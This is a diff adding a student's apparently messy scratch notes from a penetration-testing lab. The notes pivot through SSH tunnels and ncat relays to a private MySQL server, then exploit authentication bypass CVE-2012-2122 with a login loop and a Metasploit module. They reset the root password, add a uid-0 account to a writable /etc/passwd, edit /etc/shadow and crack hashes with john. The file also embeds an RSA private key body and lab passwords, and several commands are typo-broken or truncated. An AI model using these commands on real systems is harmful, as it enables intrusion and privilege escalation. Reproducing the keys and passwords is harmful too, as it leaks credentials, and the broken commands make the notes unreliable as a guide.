@@ -1,0 +1,252 @@
+
+Get access to a private service, running on a different subnet via SSH Tunnel
+
+your job is to identify active web services deployed on the remote private network and try to access the information from the private web service.
+
+so there is web service some where 
+and we have to take out the information from there
+
+ssh ubuntu@10.1.3.3
+
+yes
+WAYNE01
+
+nmap -p 3306 10.1.6.47
+
+
+ncat --sh-exec "ncat 10.1.6.47 3306" -l 43210--keep-open
+
+
+
+nmap -p 22 10.1.3.3/24
+
+ssh -N -L  localhost:8888:10.1.3.3:43210 ubuntu@10.1.3.3
+
+nmap and curl are not working in 10.1.3.3
+
+
+we used netstat -n to find ip address
+
+ssh -L 3333:localhost:3306 ubunutu@10.1.6.47
+this will give us access of mysql server to our localhost
+but it is not working
+and also for access we need password and username
+which we dont have
+
+and we dont have to do that eithe
+
+now we have to find sql version using ssh
+
+problem is that, we have nmap but cant use on different network, as we are not allowed
+and the 10.1.3 is not having nmap there, it has netstat but it cant reveal the version information
+
+and the port is 
+
+
+see
+
+
+finding any info from our ip is not possible 
+even from nmap also
+but we have already ssh access which is connected to that mysql server or that i
+
+
+so we have to make ssh connection to 1.3 then we have find version
+but they have mentioned ssh tunneling
+
+
+
+
+Ncat to access services that are only available on the local network
+
+
+
+nc --sh-exec "ncat 10.1.3.3 3306" -l 3306 --keep-open
+
+ncat -l 3306
+
+
+
+ssh ubuntu@10.1.3.3 -p WAYNE01
+
+
+
+WAYNE01
+
+ncat --sh-exec "ncat 10.6.1.47 3306" -l 43210 --keep-open
+
+nc 10.1.3.3 43210
+
+mysql --host=10.6.1.47 -u ubunutu mysql --password=blah
+
+	
+
+nmap -p 43210 --script mysql-vuln-cve2012-2122 10.1.3.5
+
+we also used netstat command to see whether our port is connected or not
+
+
+
+use auxiliary/scanner/mysql/mysql_authbypass_hashdump
+set RHOSTS 10.1.3.3
+set RPORT 43210
+set USERNAME ubuntu
+run
+
+for i in `seq 1 1000`; do mysql -P 43210 --password=bad --host 10.1.3.3 2>/dev/null; done
+mysql>
+
+
+for i in `seq 1 1000`; do mysql  -u root --password=bad -h 10.1.3.3 -p 43210 2>/dev/null; done
+
+
+UPDATE mysql.user SET Password=PASSWORD('bad') WHERE User='root';
+
+
+6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9
+
+
+1st way, decrypt the hash
+
+2nd way, reset the password, restart the service , use it in website and see what happens next
+
+3rd use metasploit to get the passsword
+
+
+
+lets try second way
+
+UPDATE mysql.user SET Password=PASSWORD('batman') WHERE User='root';
+
+FLUSH PRIVILEGES;
+
+
+mysql --host=10.1.3.3 -p 43210 -u root mysql --password=batman
+
+
+
+
+
+
+
+
+
+for i in `seq 1 1000`; do ./mysql -P 3306--password=bad --host 10.1.3.5 2>/dev/null; done
+This didnt work
+
+nmap -p 43210 --script mysql-vuln-cve2012-2122 10.1.3.5
+
+mysql --host=10.1.3.5 -u root
+
+nc 10.1.3.5 3306
+
+nc --sh-exec "ncat 10.1.3.5 3306" -l 43210 --keep-open
+
+nc 10.1.3.37 43210
+
+cd ~/Desktop/mysql-bin
+
+
+
+
+
+
+
+cat file | xclip -selection clipboard
+
+
+MIIEowIBAAKCAQEA1MeL9zVIWGX/cORs2Nb/Z7AfBZSqtZRpk6VTkRa1eqE59kA5
+y2rh5s3DyexQObwXAFygAocKfCULRdf9ZahqxGExtGa+ixoYxOXGbhBhdNRM3ojf
+rkTG3HwEAX0vq3QOm2DN6oUH6wu4AdNCsmwok7L994e55cy4ES+N5JSNs7ZEE+E7
+Ql2nHRZ2GLn9r4ByjFy+1YFbDgWKhojarxnMuDDwfJk+1WHgnLJnUA9JdMq8Txeu
+7ujpn2wGr3d9k3T2nLIq+vOGhJ6/rV4/mLqedax20M3R5NNTSvTJNOLedpOMCeMA
+15Igh9B72kItEUSnz6Cuhsts6EmJw9ngi4ruywIDAQABAoIBAByjoyYp6MvlJqWW
+SURCY+wb24EPyo5YJIG37fCIYvLXgoqviFfl0fQT2/dwtDehJmNpFCxi6rlc7xB+
+it/E9GHsRxll/t2QLKdL2hJ0Z/mmnZYSTDETlsSUeKGOrPzhyRmGxRB8yV0Mnb65
+JbAIOMnwfJh1j0Lr9BZ0FSAgEpaOgdYTdSdVyN1gPwvlTQ6Dr/3PX7eVeXbClR/V
+ovi3zoN5DCkkizkFzoMRdgOsqCKEC5/yP1xKG6r9LA6U0rSZqup+y0Vznehi/z0j
+DV5g4S6uaDF2cwk/yiwcpgEjzIszzb4ZWOjk/qkc6B1e91eHwsfXFd+nmnV/f5j7
+JajzL3ECgYEA+GTC9Ke00KD+Fg6jiWXPTAfKsyA9bTg2aqvUuh4OLGe5xTJEtAFS
+EuOZYriZp662RPpCz76sEJhv/FGxyZYEC2znFaR0Fi/T7YPpCVhEo8+85qBLBtii
+Qi2wKkPzrgMoecxpbtjY9WRV6VywzWXtAwXtz27HQEHXffasH9VUhEMCgYEA20uY
+MGiZVZ+7B31/Km7gS8RoU4mywufFqq6KI3VdfVXKCVvH5IwAB4I/YdWTTC8TNtEE
+1fGnRXp3YZVhmV1npVOsJy3XeuUepXb3W/8YzaX6Cy/h/6wxbpEgsE1fvpHhgp1j
+iugeQ4rsrcNGiQLAqf6NEIZ1eL30SuFxeIDJxtkCgYEApCtcmvzYyecN6CAmwCHU
+/6hKtVdCohQ8Cwako5pHvduUcZwGwn3489kPwKrHi4cymqZZUBryeEl4AmkwO072
+P2Lr3GcD/sH/rQS5Gd8IBsi/TiJ1VAIMQ/cUburYfJNDxjRvHr8drhpxmboUdLzA
+CHZ7tdS+xl5+AZfuLV/+6ycCgYBKFVOopu2GG5wXf7ICJ8rmTcfg0NfvOFVyv9wy
+9mdK/DxwxOzWrOUlpD69UmWcixq2ng5AKI8VzbWe5dQ+92sYUxgJdFcjUVv1Eiem
+kJtUfgnm1ZpHwWhBrg2ZAcqimq3QblM+jgQLVVd3rEyb5K4pv7DwMDxnOeTZlye6
+SefgoQKBgFx6dUmJNggGzzDTJY6qq9+8TJbYb/nnvV4OA5YKKgm4AFExSmAFSRKu
+rfbekHvnalk8BvEyGae2sHE4DbLpF9wFKA/zlarASfCKF7B63wyDi8dJu6suJO85
+gI81IlR2qFPgcF3R5bPZIKVHFIksvoPHdKEiEhfsHbUgiLk9QVLp
+
+chmod 600 /etc/ssh/id_rsa
+cd /etc/ssh	
+
+ssh ubuntu@10.1.3.10
+
+ssh key-gen
+ZoBk6draESR6s0P4sr2NjhRXllhrkybomoWdo0Hfv0Y
+
+
+
+ssh-copy-id ubuntu@10.1.3.10 -p 2222
+
+chmod 600 ~/.ssh/authorized_keys
+
+
+less ~/etc/ssh/sshd_config
+
+cd ~/etc/ssh
+
+PasswordAuthentication yes
+
+c		
+
+ssh -i /etc/ssh/id_rsa ubuntu@10.1.3.10 -p 2222
+
+ssh -i /etc/ssh/id_rsa ubuntu@10.1.3.20 -p 2222
+
+ssh -i /etc/ssh/id_rsa ubuntu@10.1.3.30 -p 2222
+
+stat -c "%a %n" 
+
+ls -la
+
+
+
+first task is to find root password for everyone
+
+in first one, password is writable file, so we will write our new acount , or we can change the passwor d of the login too
+
+vim ~/etc/passwd
+
+newroot:Lr0jreW2ki1B6:0:0:root:/root:/bin/bash
+
+
+mkpasswd -m sha-512 newpassword
+
+nano /etc/shadow
+
+$5$kw0nmxmUM4Bf6syA$uJMWpxyQnnmjemSWDiTne0hxMJNyidwUHh6IA.p8YXC
+
+https://infinitelogins.com/2021/02/24/linux-privilege-escalation-weak-file-permissions-writable-etc-shadow/
+
+mostly all asnwers we got from here
+
+
+
+
+cat hash.txt
+
+nano hash.txt
+
+$6$wiQc9hFwIfiAkV2v$4gOJ4xn.sqU9nNiaVQrpzyYSEqhJBz5CJ5p9RTVV2df8yKWoODugAU7EMtihlNVaEmQm9yLX2eQf7oQEd60j41
+
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+
+sudo wget /et -O $LFILE
+
+q1w2e3r4
+	
